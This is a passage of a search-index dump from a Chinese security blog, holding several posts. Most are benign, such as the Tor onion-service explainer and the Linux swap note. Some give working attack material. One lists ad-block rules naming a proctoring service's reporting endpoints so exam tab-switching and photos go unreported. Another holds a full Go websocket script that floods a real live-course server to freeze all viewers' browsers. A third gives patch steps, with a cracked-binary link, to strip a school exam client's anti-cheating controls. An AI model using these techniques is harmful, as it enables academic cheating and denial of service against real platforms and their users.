","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:6:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年10月4日-补充"},{"categories":["reverse"],"content":"2020年10月5日 补充 上个版本直接全部进行替换，会导致xray有些功能出现错误，这里进行了修复 增加了 arm 版的自动patch，现在能够全版本破解了 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:7:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年10月5日-补充"},{"categories":["reverse"],"content":"2020年11月6号晚 补充 刚刚发现又发新版了，发现已有的程序无法完成patch了，分析发现新的1.4虽然没有修改证书生成算法，但是针对我上面的patch进行了检查 我前面是对签名验证返回值进行修改，如果签名验证失败就改成验证成功。1.4增加了一次签名验证，验证的内容是错误的，必然会验证失败，如果patch还是修改为验证成功就落入了陷阱 思路是对的，但是问题不是在这里，我并没有对RSAVerify本身进行patch，而是patch函数返回后对结果的判断，并且只修改了一处判断，并没有对所有判断都进行修改，所以即使有检查也没有造成影响 新版本因为换用了Golang 1.14，是go的版本差异导致的patch问题（汇编不同了），目前完成了amd64平台的自动patch，其他的平台等大佬PR ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:8:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年11月6号晚-补充"},{"categories":["reverse"],"content":"2020年11月11日 补充 感谢 @nszy007 提供剩余平台的patch ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:9:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年11月11日-补充"},{"categories":["reverse"],"content":"2020年11月11日 下午16点 补充 收到 Chaitin 人员的要求，已删除相关源代码 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:10:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年11月11日-下午16点-补充"},{"categories":["reverse"],"content":"2020年11月18日 补充 思路不变，不要再给我发邮件要破解版和代码了 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:11:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年11月18日-补充"},{"categories":["reverse"],"content":"2020年11月24日 补充 证书算法没有任何修改 注意 前段时间长亭的小姐姐跟我说有人通过破解xray盈利，那时候我还不太信，真有人花钱买破解版？ 前几天算是见到了 希望不要再有人联系我要（买）破解代码和工具了，我是不会干这种事的 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:12:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年11月24日-补充"},{"categories":["coding"],"content":"学校使用雨课堂进行在线考试，测试后发现会检测切屏并拍照上传，通过对js代码的分析理清雨课堂监测切屏和上传异常照片的方法，通过插件进行屏蔽","date":"2020-06-12","objectID":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/","series":null,"tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/"},{"categories":["coding"],"content":"学校又开始推雨课堂的在线考试功能了，在老师的配合下稍微分析了一下 因为都是js代码，没有用wasm，分析还是比较简单的 ","date":"2020-06-12","objectID":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/:0:0","series":null,"tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/#"},{"categories":["coding"],"content":"切屏检测 考试过程中，如果切换浏览器标签，返回后会有一个切屏警告，并且老师那边也会有切屏记录 通过实验发现如果不切换浏览器标签，使用另一个浏览器窗口或者切换其他软件都不会触发这个记录 相关代码如下 onchange: function (t) { var e = this; if (document.hidden || 0 != e.onlineProctor || e.getCacheResult(), e.onlineProctor \u003e 0) { if (document.hidden) { e.time1 = new Date, e.uploadUnnormal(12) } else x \u0026\u0026 clearTimeout(x), x = setTimeout(function () { e.$alert(\"\", { customClass: \"alertMsg\", showClose: !1, message: \"系统监测到你切出了考试页面\u003cbr/\u003e我们会将此行为报告你的老师\", dangerouslyUseHTMLString: !0, confirmButtonText: \"继续考试\", center: !0, callback: function (t) {} }) }, 1) } else; }, 没有看代码之前我还猜想检查切屏可以通过focus来检查，看了代码后发现使用的是vue的 onchange 进行触发，然就在方法内检查document是否hidden 这样是无法检测到切换不同应用的，简直是自欺欺人啊 注意到检测到切标签后会触发 e.uploadUnnormal(12) 方法，进去看一下 uploadUnnormal: function (t) { var e = this; this.$axios.post(API.feed_add, { exam_id: this.exam_id, action: t }).then(function (t) {}).catch(function (t) { e.$message.error(\"发生错误\") }) } 其中 API.feed_add1 是 /online_proctor/stu/monitor/feed/add 这个路径 也就是说切标签后会 POST 一个标号为12的action记录，抓包后也发现的确如此，也仅仅而已 ","date":"2020-06-12","objectID":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/:1:0","series":null,"tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/#切屏检测"},{"categories":["coding"],"content":"照片上传 查看请求发现图片是先上传到七牛云，然后将返回的连接发给服务器 handleCapture: function () { var t = this, e = this.context, n = this.$refs.video; if (this.isexam) e.drawImage(n, 0, 0, 160, 120); else if (e.drawImage(n, 0, 0, 240, 180), this.reTake) return void this.$emit(\"changeReTake\", !1); setTimeout(function () { var e = t.$refs.canvas.toDataURL(\"image/jpeg\", 1), n = Object(u.b)(e, Date.now()); t.upload(n).then(function (e) { var n = e \u0026\u0026 e.url; t.image_url = n, t.$emit(\"changeReTake\", !0), t.$emit(\"changeCanEnter\", !0), t.isexam \u0026\u0026 t.postRecord(n, 0, 0, 0, 1) }) }, 0) }, upload: function (t) { var e = c.a.qiniuDomain; return new s.a(function (n, r) { var i = { next: function (t) { t.total.percent }, error: function (t) { r({ url: \"\" }) }, complete: function (t) { var r = e + \"/\" + encodeURIComponent(t.key); n({ url: r }) } }; c.a \u0026\u0026 c.a.upload(t, i, \"image\", !1) }) }, postRecord: function (t, e, n, r, i) { var o = { exam_id: this.examid, image_url: t, label: e, event_group_id: n, operator_id: r, action: i }; this.$axios.post(API.upload_photograph, o) .then(function (t) {}) .catch(function (t) {}) } ","date":"2020-06-12","objectID":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/:2:0","series":null,"tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/#照片上传"},{"categories":["coding"],"content":"如何绕过 那啥，就几个有用的url，反正都是后台请求，当做广告拦截了就行，这样老师那边就没有切屏警告和异常照片了 changjiang-exam.yuketang.cn/online_proctor/stu/monitor/feed/add changjiang-exam.yuketang.cn/online_proctor/stu/photograph/add upload.qiniup.com upload-z1.qiniup.com upload-z2.qiniup.com upload-na0.qiniup.com upload-as0.qiniup.com 插件我用的AdblockPLUS，手动添加几条规则就行，亲测好用 ","date":"2020-06-12","objectID":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/:3:0","series":null,"tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://zu1k.com/posts/security/web-security/yuketang-exam-block-report/#如何绕过"},{"categories":["coding"],"content":"前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错 对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制 并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给所有直播课的听众 用户的浏览器效率比较低，无法及时处理后端返回的所有评论，从而导致浏览器卡死，如此只需要一个用户不断发送评论包，所有用户都会受到dos攻击 评论代码如下： package main import ( \"flag\" \"log\" \"net/http\" \"net/url\" \"os\" \"os/signal\" \"time\" \"github.com/gorilla/websocket\" ) var addr = flag.String(\"addr\", \"trans.college.360.cn\", \"http service address\") func main() { flag.Parse() log.SetFlags(0) interrupt := make(chan os.Signal, 1) signal.Notify(interrupt, os.Interrupt) u := url.URL{ Scheme: \"wss\", Host: *addr, Path: \"/ws\", RawQuery: \"live_course_id=10114\" } log.Printf(\"connecting to %s\", u.String()) header := make(http.Header) header[\"Origin\"] = []string{\"https://admin.college.360.cn\"} header[\"User-Agent\"] = []string{\"Chrome/80.0.3987.122\"} header[\"Cookie\"] = []string{\"your cookie\"} dialer := websocket.DefaultDialer dialer.EnableCompression = true c, _, err := dialer.Dial(u.String(), header) if err != nil { log.Fatal(\"dial:\", err) } defer c.Close() done := make(chan struct{}) go func() { defer close(done) for { _, message, err := c.ReadMessage() if err != nil { log.Println(\"read:\", err) return } log.Printf(\"recv: %s\", message) } }() ticker := time.NewTicker(1) defer ticker.Stop() for { select { case \u003c-done: return case \u003c-ticker.C: err := c.WriteMessage(websocket.TextMessage, []byte( \"{\\\"cmd\\\":\\\"newMessage\\\",\\\"message\\\":\\\"感谢360\\\"}\" )) if err != nil { log.Println(\"write:\", err) return } case \u003c-interrupt: log.Println(\"interrupt\") err := c.WriteMessage( websocket.CloseMessage, websocket.FormatCloseMessage( websocket.CloseNormalClosure, \"\" ) ) if err != nil { log.Println(\"write close:\", err) return } select { case \u003c-done: case \u003c-time.After(time.Second): } return } } } 可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制 ","date":"2020-05-29","objectID":"https://zu1k.com/posts/security/web-security/dos-attack-on-360-university-user/:0:0","series":null,"tags":["coding","dos"],"title":"利用360直播课评论区对用户浏览器dos攻击","uri":"https://zu1k.com/posts/security/web-security/dos-attack-on-360-university-user/#"},{"categories":["event"],"content":"昨天看了一篇文章，文章最后使用IP logger进行钓鱼，最后记录下来的IP地址让我大跌眼镜 万万没有想到，记录下来的IP地址竟然是是 244.242.105.51 这可是一个E类IP地址，是属于保留地址，是未来用来做ip研究用的，目前并没有开放使用啊 考虑到文章中是对一个地下黑客组织进行钓鱼，所以我有理由相信，这个访问记录是通过某种高超的我从来没有听说过的手段实现的 IP Logger为啥会记录到这样一个IP的访问呢？ 这个问题一直到现在都在困扰我 下面记录一下我对这个的分析 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/:0:0","series":null,"tags":["Tor"],"title":"一个来自保留IP地址的连接","uri":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/#"},{"categories":["event"],"content":"大端？小端？ 众所周知计算机程序根据cpu架构和操作系统种类不同，数据在内存中存放有大端序和小端序两种情况，这个顺序叫做主机序 而网络传输需要在不同主机序的计算机之间兼容，所以又规定了一个网络序，规定网络传输一律使用大端序 文章中作者猜测是访问者使用的主机是小端序的，所以会又这样一个记录 我个人认为这个猜测不成立 因为一般ip层报文都是由操作系统网络栈来构造的，操作系统自身不会犯忘记转换成网络序的错误 即使是访问者技术高超自己写代码构造的ip包，那源ip是E类ip地址，返程的ip包根本没有路由啊，这样子连tcp连接都建立不了，更不要谈ip logger记录下浏览器的user-agent ","date":"2020-05-25","objectID":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/:1:0","series":null,"tags":["Tor"],"title":"一个来自保留IP地址的连接","uri":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/#大端小端"},{"categories":["event"],"content":"Tor? 考虑到记录下来的user-agent与tor浏览器的一致，并且对方是黑客组织，使用tor也是非常普遍，所以分析一下通过tor能不能实现伪造自己的ip为E类ip tor连接的流程中，每个tor relay不会知道完整的路由路径，只知道上一个节点与下一个节点，并且这个路由是在应用层实现的，如果黑客控制了某些tor relay，通过这些relay能不能实现这个伪造？ ","date":"2020-05-25","objectID":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/:2:0","series":null,"tags":["Tor"],"title":"一个来自保留IP地址的连接","uri":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/#tor"},{"categories":["event"],"content":"提供onion service 如果ip logger提供onion service，那他记录下来的ip应该是 会合节点的ip 通过我上一篇博客学习的内容可以知道，这个会合节点是由客户端选择的，所以我们假设黑客这里选择了自己控制的某个tor relay作为会合节点，并且将这个E类ip地址写在介绍信中发送给介绍节点 ip logger服务器如果没有怀疑这个E类IP地址，通过tor网络去连接这个会合节点，那在它的exit relay那里一定会连不上这个ip，因为会出现空路由 所以如果要让连接成功建立，必须让ip logger到会合节点的relay路径中某个relay节点对这个错误的ip进行了更正，最简单的是控制exit relay，检查到最终访问的是错误ip便进行更正 而这个relay路径中的每个relay都是ip logger自己选择的，所以黑客需要控制tor网络中的大部分relay????这不现实！！！ ","date":"2020-05-25","objectID":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/:2:1","series":null,"tags":["Tor"],"title":"一个来自保留IP地址的连接","uri":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/#提供onion-service"},{"categories":["event"],"content":"不提供onion service 如果ip logger不是提供onion service，而是提供公开的服务，那它记录下来的应该是 黑客选择的exit relay，即使黑客控制了这个relay也没办法伪造ip啊 所以通过tor的某些机制伪造成这个E类ip不太现实 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/:2:2","series":null,"tags":["Tor"],"title":"一个来自保留IP地址的连接","uri":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/#不提供onion-service"},{"categories":["event"],"content":"路由劫持？ 我对公网的路由不太了解，但是看样子进行路由劫持是有可能的 如果黑客创建了一条假的路由路径，并在路由途中的某个节点对这个E类ip进行更正，也是有可能的，不过看起来难度很大啊 才疏学浅，文中可能有错误，欢迎指正 目前这个问题还在困扰我，如果有大佬知道答案，希望能够告诉我 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/:3:0","series":null,"tags":["Tor"],"title":"一个来自保留IP地址的连接","uri":"https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/#路由劫持"},{"categories":["learn"],"content":"昨天遇到了点问题，为了研究清楚原理，把Tor客户端与服务端通信的具体流程学习了一下，这篇博文写来记录 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:0:0","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#"},{"categories":["learn"],"content":"通信流程 这里要描述的通讯是 用户通过 tor浏览器 连接 洋葱服务 的过程 为了方便表达，这里用Alice表示客户端，Bob表示服务端 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:1:0","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#通信流程"},{"categories":["learn"],"content":"第一步：服务端设置自己的介绍节点 服务端为了不暴漏自己的IP，使用 介绍节点(introduction points) 来转发来自客户端的介绍信 首先，Bob从 tor中继节点列表 中挑选几个节点来做自己的 介绍节点，然后与它们建立 长连接(long-term circuits) 这里的长连接是通过tor网络建立起来的，所以是匿名的，介绍节点不会知道Bob的IP 同时，Bob会给介绍节点发送一个 身份验证密钥(authentication key)，当有客户端连接这个介绍节点时，通过这个密钥便能判断这个连接是否是找Bob的 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:1:1","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#第一步服务端设置自己的介绍节点"},{"categories":["learn"],"content":"第二步：服务端公开自己的信息 Bob 生成一个 描述信息(onion service descriptor)，里面存储了介绍节点列表，包括介绍节点的ip和相应的身份验证密钥 然后Bob用自己的私钥对这个消息签名，并将这个消息发布到Tor的DHT中 经过这步操作，tor客户端便可以通过某个key从DHT中获取到这个消息，从而找到Bob的介绍节点 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:1:2","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#第二步服务端公开自己的信息"},{"categories":["learn"],"content":"第三步：客户端获取介绍节点列表 Alice（客户端）从某些途径知道Bob有一个洋葱服务，并且知道这个服务的onion域名，例如 xyz.onion，此时Alice想要访问Bob. 首先，她向DHT网络请求该域名对应的信息，也就是第二步中Bob发布的那个描述消息 获取到消息后，Alice对其签名进行验证，验证使用的Bob的公钥其实已经被编码到 xyz.onion 这个域名中了，Alice可以从域名中解码出来 消息没问题，Alice从消息中解析出Bob的介绍节点列表，选择其中一个介绍节点，Alice将要向Bob介绍自己 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:1:3","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#第三步客户端获取介绍节点列表"},{"categories":["learn"],"content":"第四步：客户端选择一个会合节点 Alice从tor中继节点列表中选择一个节点作为 会合节点(rendezvous point)，然后通过tor与该 会合节点(RP) 建立连接 同时，Alice会给会合节点发送一个 一次性密码(one-time secret)，这个密码会在回合过程中使用 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:1:4","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#第四步客户端选择一个会合节点"},{"categories":["learn"],"content":"第五步：客户端向服务端介绍自己 Alice生成一个消息，包含 会合节点 和 一次性密码，然后用Bob的公钥对消息进行加密 Alice通过Tor网络连接上 Bob 的一个介绍节点，让该介绍节点把加密后的消息转发给Bob ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:1:5","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#第五步客户端向服务端介绍自己"},{"categories":["learn"],"content":"第六步：服务端与客户端回合 此时Bob已经收到介绍节点转发过来的消息，知道Alice想要访问自己，并且知道了会合节点的信息 Bob通过Tor网络连接会合节点，然后将收到的一次性密码发送给会合节点，会合节点由此知道 Bob是要与Alice通信，从而可以将Alice与Bob的消息进行中继 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:1:6","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#第六步服务端与客户端回合"},{"categories":["learn"],"content":"安全性 客户端与服务端最终是通过会合节点通讯的，他们都各自通过tor网络分别连接会合节点，因此既能够保证客户端的隐匿性又能够保证服务端不暴露 在上面流程中的所有通讯都是用过tor网络建立的，包括 服务端与介绍节点的通讯、客户端与介绍节点的通讯、客户端与会合节点的通讯、服务端与会合节点的通讯 因此，正常情况下tor客户端与洋葱服务通讯是经过6次中转的，包括客户端连接会合节点的3次和服务端连接会合节点的3次 如果tor客户端访问的服务不是洋葱服务，那通讯过程就不是上面那个流程了，也只有3次中转了 ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:2:0","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#安全性"},{"categories":["learn"],"content":"参考资料 https://community.torproject.org/onion-services/overview/ ","date":"2020-05-25","objectID":"https://zu1k.com/posts/learn/how-do-onion-service-work/:3:0","series":null,"tags":["Tor"],"title":"Tor洋葱服务如何工作","uri":"https://zu1k.com/posts/learn/how-do-onion-service-work/#参考资料"},{"categories":["thinking"],"content":"初中的时候有时熬夜到九点十点都没睡觉，闲着没事找广播听，发现了这样一个神奇的节目，名字叫做青春梦飞扬，主持人叫大脑门管鑫。 从此几乎每天都要准时听青春梦飞扬，节目里面的东西都比较有趣，大部分是实事的一些交流和互动，还会有一些有趣的小知识。 到了高中，由于住校和晚自习的存在就没有机会听那个时间段的广播了 前段时间小米更新增加了一个在线收音机的软件，那天我没睡着就打开收音机 找青春梦飞扬这个节目，最后却没找到。 上网搜索了一番，包括广播台的网站和节目的百度贴吧，发现这个节目几年前也就是我上高三的时候貌似，停止了。 大脑门管鑫还发了一段录音，告别词。还有一个小活动，当初结束时的小活动，找到身边的听友，一起回忆一下节目几年来的有趣的难忘的经历。 突然很伤感，天下的宴席终究有结束的那一天，而越是温馨、令人愉悦的东西，结束的时候越令人难以割舍，即使已经过去好多年，回想起来仍仿佛就发生在昨日，那是陪伴我好一段安静夜晚的美妙时光。 ","date":"2020-05-18","objectID":"https://zu1k.com/posts/thinking/youthful-dreams-soar/:0:0","series":null,"tags":["thinking","回忆"],"title":"青春梦飞扬","uri":"https://zu1k.com/posts/thinking/youthful-dreams-soar/#"},{"categories":["reverse"],"content":"前言 近期，学校开始测试线上考试系统，据说十分流氓，开搞！ 从大一学弟那里拿到了相关程序和说明文档，经过学弟的使用体验，程序开始运行会自动杀死QQ、微信等程序，隐藏并屏蔽任务栏和开始菜单，强制全屏并屏蔽一些常用的快捷键包括窗口切换等。 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:1:0","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#前言"},{"categories":["reverse"],"content":"开搞 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:0","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#开搞"},{"categories":["reverse"],"content":"基本信息 在虚拟机里安装程序后，先观察一下安装目录结构和里面的文件 仔细查看了各个文件夹下的内容，最终得出结论，是个QT编写的套壳浏览器，用的 QtWebEngine 查看主程序的信息，32位未加壳C++程序，本身非常小，只有不到1M，大部分功能应该都是调库实现的 下面开始逆向，拖入IDA 32位，自动定位到入口函数start，从执行流图中可以看到程序本身结构非常简单 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:1","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#基本信息"},{"categories":["reverse"],"content":"正着走 下面从start开始分析 可以看到一开始start函数的栈指针分析就出问题了，但是start本身的调用非常简单，不妨来看一下 首先是 第一个call指令，进入这个函数 发现是 security_cookie检查，没有什么实际作用 第二个是个无条件跳转 jmp，进去看一下 可以看到这一段东西比较多，特别是各种不知道什么作用的call非常多，并且自动反编译出问题了，这个反编译问题应该是比较好解决的，我没有深究 简单看了一下调用的call，越深入越复杂，到这里分析不下去了，东西有点多，从其他方面入手 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:2","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#正着走"},{"categories":["reverse"],"content":"去除杀进程 先来看一下字符串，很幸运字符串没有进行加密，因为我们知道程序会杀死qq，不如直接来搜索关键字QQ 看一下交叉引用 只有一个函数调用了它，先进入看看这个函数，关键部分如下 这就比较清楚了，程序是通过QProcess调用taskkill命令来强制来杀死这些程序的，会被杀死的程序包括实时聊天软件qq、微信，远程协助软件teamviwer、向日葵远程控制。 在这里我们需要去除这个杀死进程的机制，直接将执行的命令字符串给清空就行 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:3","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#去除杀进程"},{"categories":["reverse"],"content":"去除隐藏任务栏 同时这段命令所在的这个函数在前面还有一堆对QtWebEngine的初始化 这个函数后面的部分有点意思，看到了一些字符串不清楚什么意思 我个人对tray比较敏感，因为做过任务栏图标程序的开发，知道任务栏的英文是tray 这里对 Shell_TrayWhd 进行搜索 发现windows系统有一些特殊的窗口句柄，而这个正式任务栏窗口句柄 一开始我还对这个考试程序怎么隐藏任务栏感兴趣，现在都一目了然了，先通过系统函数获得句柄，然后调用ShowWindow将窗口设置为不显示 这里的ProgMan是任务管理器，所以说这段代码同时屏蔽了任务栏、开始菜单和任务管理器 我们需要去除这种屏蔽机制，这也非常简单，来看汇编 发现在调用showwindow前需要将参数 True or False push入栈，也就是 call ShowWindow前面的push 0，只需要修改这几处汇编即可 将push 0修改为push 1即可去除他的屏蔽(后面的分析知道 push 5 比较好) ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:4","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#去除隐藏任务栏"},{"categories":["reverse"],"content":"去除强制全屏 下面我们来去除一下窗口全屏，虽然有任务栏可以用了，但是全屏会挡住，不好用 还是刚刚那个函数，通过不断查交叉应用，最后定位到start第二次jmp后的代码中 通过前面对前前后后的call和跳转的分析，可以知道没有啥具体内容，所以还得从刚刚的那个函数入手 发现后面有一个call 进入后 发现这个函数是要将之前设置的任务栏隐藏等给还原，所以这里应该是要退出了，重要的内容还是在杀死qq的那些操作和这个函数中间的位置 仔细分析后，找到了关键的地方 这和函数在最后面会获取主屏幕的长和宽，然后调用resize函数设置窗口大小，从而使窗口占满屏幕 这里看一下汇编 其实还是比较难搞的，东西比较紧凑，没法插入太多的汇编，又不想进行大改增加一个call，那就只把开始菜单的地方留出来吧，也就是只修改窗口的高 因为需要先把高入栈，所以前面的宽先存到 esi，我们先不要动这个，先把高减一个数然后push进去再push esi，修改之后如下 这样显示的窗口就不会挡住任务栏，我们就可以切换窗口了 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:5","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#去除强制全屏"},{"categories":["reverse"],"content":"恢复窗口和按钮 后来又想，如果可以手动修改窗口大小就好了，再有个放大、缩小的按钮并且能移动位置就更爽了，那就接着搞 之前做过qt的开发，知道有一个窗口属性是可以隐藏系统窗口，只显示里面的内容从而使窗口无法修改大小和移动位置 搜索一番后发现使用的使 setWindowFlags 函数来实现的，那就从imports里面找一下吧 看交叉引用然后一个一个进去看，最后定位到一个函数，我给他起名 initWindowsComponent，前面的分析我也都相应的进行改名了，分析起来方便记忆 我这个起名应该是非常贴切了，的确是往窗口里面添加各种菜单按钮组件 在后面找到了setWindowFlags调用，但是因为qt里面用的是枚举类型，编译后都变成数字了，只能去看qt的源码 传入的枚举类型使WindowsFlags类型，跟进去后发现又是一个WindowType类型 再接着跟进，就看到了全部的内容 2048换成16进制是0x800 根据代码是无边框类型 我们需要的是有边框有放大缩小和关闭按钮，所以需要的类型是 此时还没有关闭按钮，根据计算方式，还需要或上关闭按钮的值 修改这个参数后窗口就可以随意移动、修改大小、缩小或者全屏了。 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:6","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#恢复窗口和按钮"},{"categories":["reverse"],"content":"绕过摄像头检查 我们还知道这个程序还必须要摄像头检查通过，通过简单的实验，发现摄像头只需要检查通过一次，后面不会重复检查，只会读取device.ini文件，所以我们增加这个文件，并手动指定检查通过 同时通过搜索字符串查看交叉引用可以找到需要读取或者写入文件的地方，这里没有深入研究了，谁敢兴趣谁去研究 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:7","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#绕过摄像头检查"},{"categories":["reverse"],"content":"其他地方 在对这个程序探究的过程中，还发现了tab栏和menu栏可以打开显示，但是实际作用不大，就没有管。 同时通过burp抓包和测试，找到了在线考试的登录接口并发现普通浏览器可以正常使用 同时通过对相关接口的测试，找到了任意密码修改和个人信息泄露的漏洞 ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:2:8","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#其他地方"},{"categories":["reverse"],"content":"申明与文件 同时本次研究完全以学习为目的，不得将上述内容用作商业或非法，否则一切后果由用户负责。您必须在下载后的24个小时之内，从您的电脑中彻底删除上述内容。 破解之后的程序 {% asset_link 线上考试.zip [点击下载] %} ","date":"2020-05-01","objectID":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/:3:0","series":null,"tags":["reverse","Crack"],"title":"逆向破解学校在线考试客户端","uri":"https://zu1k.com/posts/security/reverse/crack-sdu-online-exam-software/#申明与文件"},{"categories":["coding"],"content":"给 linux 服务器添加swap做了好几次了，每一次都没记住，临时去网上查命令，这里特地记录一下 ","date":"2020-04-12","objectID":"https://zu1k.com/posts/linux/linux-add-swap/:0:0","series":null,"tags":["linux","swap"],"title":"Linux添加swap","uri":"https://zu1k.com/posts/linux/linux-add-swap/#"},{"categories":["coding"],"content":"查看当前swap sudo swapon --show 如果没有输出说明没有swap 